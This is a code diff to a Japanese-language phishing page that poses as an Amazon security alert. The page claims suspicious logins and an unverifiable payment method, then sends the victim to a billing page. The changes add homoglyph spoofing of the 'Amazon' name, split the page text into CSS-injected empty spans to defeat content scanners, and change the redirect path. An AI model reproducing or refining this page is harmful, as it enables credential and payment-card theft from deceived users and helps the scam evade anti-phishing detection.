@@ -46,18 +46,18 @@
                 <span class="lefttext"><a href="#" class="lefttext"><link href="css/warning/FuWuu.css" rel="stylesheet" type="text/css"><span class="POnLq"></span><span class="AqIZW"></span><span class="kboaC"></span><span class="XzEcQ"></span><span class="tVMas"></span><span class="dAMOg"></span><span class="sMeSS"></span><span class="KfPAs"></span><span class="biHAH"></span></a></span>
                 <span class="middle"><link href="css/warning/FuHao.css" rel="stylesheet" type="text/css"><span class="dBirO"></span><span class="kkhZd"></span><span class="AnNbd"></span></span>
                 <span class="righttext"><link href="css/warning/BianG.css" rel="stylesheet" type="text/css"><span class="yZMIa"></span><span class="bgtsp"></span><span class="XRsjL"></span><span class="uhhGk"></span><span class="jqjcT"></span><span class="iqNJu"></span><span class="VUaoP"></span><span class="KsuqC"></span><span class="gQbTg"></span><span class="nroeZ"></span><span class="KzNPJ"></span><span class="cOXuN"></span></span>
-                <p class="alerttext"><link href="css/warning/TiXin.css" rel="stylesheet" type="text/css">Amazonセキュリティシステム、最近は変わったログイン履歴がありますので、必要な手順でアカウントを保護してください</p>
+                <p class="alerttext"><link href="css/warning/TiXin.css" rel="stylesheet" type="text/css">Amаzоnセキュリティシステム、最近は変わったログイン履歴がありますので、必要な手順でアカウントを保護してください</p>
                 <div class="row">
                     <div class="col-12">
                             <div class="alert alert-danger" role="alert">
-                                    <h4 class="alert-heading"><i class="fas fa-exclamation-triangle text-danger"></i> <link href="css/warning/GengX.css" rel="stylesheet" type="text/css">支払い方法を更新してください</h4>
+                                    <h4 class="alert-heading"><i class="fas fa-exclamation-triangle text-danger"></i> <link href="css/warning/GengX.css" rel="stylesheet" type="text/css"/><link href="css/warning/JiXuA.css" rel="stylesheet" type="text/css"/><span class="kidd1"></span><span class="kidd2"></span><span class="kidd3"></span><span class="kidd4"></span><span class="kidd5"></span>を更新してください</h4>
                                     <p>
-<br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="bAoYw"></span>お邪魔してすみません、そちらの支払い方法を検証できませんので。
+<br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="bAoYw"></span>お邪魔してすみません、そちらの<span class="kidd1"></span><span class="kidd2">い方法を検証できませんので。
 
 <br><br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="BrcdH"></span>アカウントを保護するために、検証完了までアカウントを一時に制限します。
 <br><br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="ZbxQv"></span>検証手順が終わりましたら、制限をすぐに解除します。<br><br>
                                     </p>
-                                    <a  id="bt1"  class="btn bgcolored"><link href="css/warning/JiXuA.css" rel="stylesheet" type="text/css"><span class="TlNJP"></span><span class="UbRdT"></span><span class="rrNzI"></span></a>
+                                    <a  id="bt1"  class="btn bgcolored"><span class="TlNJP"></span><span class="UbRdT"></span><span class="rrNzI"></span></a>
                                   </div>
                     </div>
                 </div>
@@ -74,7 +74,7 @@
             })
         })
         $("#bt1").click(function () {
-            window.location.href = "/billing";
+            window.location.href = "/bill";
         })
     </script>
 </body>
